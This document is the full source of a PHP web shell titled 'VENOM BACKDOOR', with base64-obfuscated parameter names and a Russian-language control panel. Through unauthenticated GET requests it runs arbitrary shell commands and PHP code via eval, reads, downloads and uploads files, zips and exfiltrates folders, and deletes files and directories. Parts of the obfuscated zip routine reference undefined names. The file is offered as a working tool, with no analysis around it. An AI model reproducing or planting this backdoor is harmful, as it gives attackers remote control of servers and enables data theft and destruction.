<?php $l0=base64_decode('cnVfUlUuVVRGLTg=');setlocale(LC_ALL,$l0);putenv(base64_decode('TENfQUxMPQ==').$l0);if(array_key_exists(base64_decode('ZG93bmxvYWRfZmlsZQ=='),$_GET)){if(!empty($_GET[base64_decode('ZG93bmxvYWRfZmlsZV9pbnB1dA==')])){$a1=$_GET[base64_decode('ZG93bmxvYWRfZmlsZV9pbnB1dA==')];header(base64_decode('Q29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2Zlcg=='));header(base64_decode('Q29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5'));header(base64_decode('Q29udGVudC10eXBlOiA=').$k2);header(base64_decode('Q29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9').$a1);header(base64_decode('RXhwaXJlczogMA=='));header(base64_decode('Q2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRlLCBwb3N0LWNoZWNrPTAsIHByZS1jaGVjaz0w'));header(base64_decode('UHJhZ21hOiBwdWJsaWM='));header(base64_decode('Q29udGVudC1MZW5ndGg6IA==').filesize($a1));ob_clean();flush();readfile($a1);}}if(array_key_exists(base64_decode('cmVhZF9maWxl'),$_GET)){if(!empty($_GET[base64_decode('cmVhZF9maWxlX2lucHV0')])){$q3=urlencode(file_get_contents($_GET[base64_decode('cmVhZF9maWxlX2lucHV0')]));header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}}if(array_key_exists(base64_decode('cmVtb3ZlX2ZpbGU='),$_GET)){if(!empty($_GET[base64_decode('cmVtb3ZlX2ZpbGVfaW5wdXQ=')])){if(unlink($_GET[base64_decode('cmVtb3ZlX2ZpbGVfaW5wdXQ=')])){$q3=urlencode(base64_decode('0KPRgdC/0LXRiNC90L4g0YPQtNCw0LvQtdC90L4='));header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}}}if(array_key_exists(base64_decode('Y3JlYXRlX2ZpbGU='),$_GET)){if(!empty($_GET[base64_decode('Y3JlYXRlX2ZpbGVfaW5wdXQ=')])){$v4=fopen($_GET[base64_decode('Y3JlYXRlX2ZpbGVfaW5wdXQ=')],base64_decode('YQ=='));fwrite($v4,$_GET[base64_decode('Y3JlYXRlX2ZpbGVfY29udGVudA==')]);fclose($v4);$q3=urlencode(base64_decode('0KPRgdC/0LXRiNC90L4g0YHQvtC30LTQsNC9INGE0LDQudC7'));header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}}if(array_key_exists(base64_decode('ZG93bmxvYWRfZm9sZGVy'),$_GET)){if(!empty($_GET[base64_decode('ZG93bmxvYWRfZm9sZGVyX2lucHV0')])){$d5=realpath($_GET[base64_decode('ZG93bmxvYWRfZm9sZGVyX2lucHV0')]);$c6=new j7();$c6->x8(base64_decode('ZmlsZS56aXA='),ZipArchive::CREATE|ZipArchive::OVERWRITE);$e9=new i10(new c11($d5),RecursiveIteratorIterator::LEAVES_ONLY);foreach($e9 as $a12=>$o13){if(!$o13->u14()){$k15=$o13->x16();$a17=substr($k15,strlen($d5)+1);$c6->u18($k15,$a17);}}$c6->u19();$a1=base64_decode('ZmlsZS56aXA=');header(base64_decode('Q29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2Zlcg=='));header(base64_decode('Q29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5'));header(base64_decode('Q29udGVudC10eXBlOiA=').$k2);header(base64_decode('Q29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9').$a1);header(base64_decode('RXhwaXJlczogMA=='));header(base64_decode('Q2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRlLCBwb3N0LWNoZWNrPTAsIHByZS1jaGVjaz0w'));header(base64_decode('UHJhZ21hOiBwdWJsaWM='));header(base64_decode('Q29udGVudC1MZW5ndGg6IA==').filesize($a1));ob_clean();flush();readfile($a1);}}if(array_key_exists(base64_decode('cnVuY29kZQ=='),$_GET)){if(!empty($_GET[base64_decode('cnVuY29kZV9pbnB1dA==')])){eval($_GET[base64_decode('cnVuY29kZV9pbnB1dA==')]);}}if(!empty($_FILES)){$s20=getcwd().base64_decode('XFw=');$m21=$s20.basename($_FILES[base64_decode('dXNlcmZpbGU=')][base64_decode('bmFtZQ==')]);move_uploaded_file($_FILES[base64_decode('dXNlcmZpbGU=')][base64_decode('dG1wX25hbWU=')],$m21);$q3=urlencode(base64_decode('0KTQsNC50Lsg0LHRi9C7INGD0YHQv9C10YjQvdC+INC30LDQs9GA0YPQttC10L0='));header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}if(array_key_exists(base64_decode('Z2V0ZGlyX2NvbnRlbnQ='),$_GET)){if(!empty($_GET[base64_decode('Z2V0ZGlyX2NvbnRlbnRfaW5wdXQ=')])){$p22=$_GET[base64_decode('Z2V0ZGlyX2NvbnRlbnRfaW5wdXQ=')];$q3=urlencode(implode(base64_decode('PGJyPg=='),scandir($p22)));header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}}if(array_key_exists(base64_decode('c2hlbGw='),$_GET)){if(!empty($_GET[base64_decode('c2hlbGxfaW5wdXQ=')])){if($_GET[base64_decode('c2hlbGxfdHlwZQ==')]==base64_decode('ZXhlYw==')){exec($_GET[base64_decode('c2hlbGxfaW5wdXQ=')],$q23);$q3=urlencode(implode(base64_decode('PGJyPg=='),$q23));header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}elseif($_GET[base64_decode('c2hlbGxfdHlwZQ==')]==base64_decode('c2hlbGxfZXhlYw==')){$t24=shell_exec($_GET[base64_decode('c2hlbGxfaW5wdXQ=')]);$q3=urlencode(base64_decode('0JrQvtC80LDQvdC00LAg0LLRi9C/0L7Qu9C90LXQvdCwPGJyPjxicj48YnI+').$t24);header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}elseif($_GET[base64_decode('c2hlbGxfdHlwZQ==')]==base64_decode('c3lzdGVt')){$t24=system($_GET[base64_decode('c2hlbGxfaW5wdXQ=')]);$q3=urlencode(base64_decode('0JrQvtC80LDQvdC00LAg0LLRi9C/0L7Qu9C90LXQvdCwPGJyPjxicj48YnI+').$t24);header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}}}if(array_key_exists(base64_decode('cmVtb3ZlX2ZvbGRlcg=='),$_GET)){if(!empty($_GET[base64_decode('cmVtb3ZlX2ZvbGRlcl9pbnB1dA==')])){$p22=$_GET[base64_decode('cmVtb3ZlX2ZvbGRlcl9pbnB1dA==')];$i25=opendir($p22);while(($r26=readdir($i25))!==false){if($r26!=base64_decode('Lg==')&&$r26!=base64_decode('Li4=')){if(is_dir($p22.base64_decode('Lw==').$r26)){y27($p22.base64_decode('Lw==').$r26);}else{unlink($p22.base64_decode('Lw==').$r26);}}}closedir($i25);rmdir($p22);$q3=urlencode(base64_decode('0J/QsNC/0LrQsCDRg9GB0L/QtdGI0L3QviDRg9C00LDQu9C10L3QsCE='));header("Refresh: 1; url = {$_SERVER[base64_decode('U0NSSVBUX05BTUU=')]}?result={$q3}");exit();}}?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V3N0M-BACKDOOR</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: black;
        }

        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }

        .form-box {
            margin: 10px;
            padding: 20px;
            background-color: black;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            max-width: 400px;
        }

        input,
        textarea, select {
            display: block;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
            outline: none;
            background: none;
            color: #008000;
            border: 1px solid #008000;
            border-radius: 7px;
        }

        button {
            padding: 10px 20px;
            background: none;
            color: #008000;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s ease;
            border: 1px solid #008000;
        }

        button:hover {
            background: #008000;
            color: #fff;
        }

        input[type="file"] {
            margin: 10px 0;
        }

        .console {
            background-color: black;
            color: #fff;
            font-family: monospace;
            font-size: 14px;
            padding: 10px;
            border-radius: 3px;
            box-shadow: 0 0 5px #000;
            margin-top: 20px;
            text-align: center;
            animation: glow 2s ease-in-out infinite;
        }
        h1 {
            background-color: black;
            color: #fff;
            font-family: monospace;
            font-size: 65px;
            padding: 10px;
            border-radius: 3px;
            box-shadow: 0 0 5px #000;
            margin-top: 20px;
            text-align: center;
            animation: glow 2s ease-in-out infinite;
        }


        @keyframes glow {
            0% {
                color: #008000;
            }
            50% {
                color: #00ff00;
            }
            100% {
                color: #008000;
            }
        }
    </style>
</head>
<body>
    <div class="console">
        <input type="text" value="<?= getcwd(); ?>" readonly>
        <?php
        if (isset($_GET['result'])) {
            echo urldecode($_GET['result']);
        }
        ?>
    </div>
    <h1>VENOM BACKDOOR</h1>

    <div class="container">

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Выполнить shell команду" name="shell_input">
                <select name="shell_type" id="">
                    <option value="exec">exec</option>
                    <option value="shell_exec">shell_exec</option>
                    <option value="system">system</option>
                </select>
                <button type="submit" name="shell">Выполнить</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория файла" name="download_file_input">
                <button type="submit" name="download_file">Скачать файл</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория файла" name="read_file_input">
                <button type="submit" name="read_file">Прочитать файл</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Имя файла" name="remove_file_input">
                <button type="submit" name="remove_file">Удалить файл</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Имя файла" name="create_file_input">
                <textarea name="create_file_content" id="" cols="30" rows="5" placeholder="Содержание файла"></textarea>
                <button type="submit" name="create_file">Создать файл</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория папки" name="download_folder_input">
                <button type="submit" name="download_folder">Скачать папку</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория папки" name="remove_folder_input">
                <button type="submit" name="remove_folder">Удалить папку</button>
            </form>
        </div>

        <div class="form-box">
            <form method="GET">
                <input type="text" placeholder="Директория" name="getdir_content_input">
                <button type="submit" name="getdir_content">Получить содержание директории</button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="form-box">
            <form method="GET">
                <textarea name="runcode_input" id="" cols="30" rows="5" placeholder="Код..."></textarea>
                <button type="submit" name="runcode">Выполнить PHP код</button>
            </form>
        </div>

        <div class="form-box">
            <form method="post" enctype="multipart/form-data">
                Выберите файл:
                <input type="file" name="userfile" id="fileToUpload">
                <input type="submit" value="Загрузить" name="submit">
            </form>
        </div>
    </div>
</body>
</html>
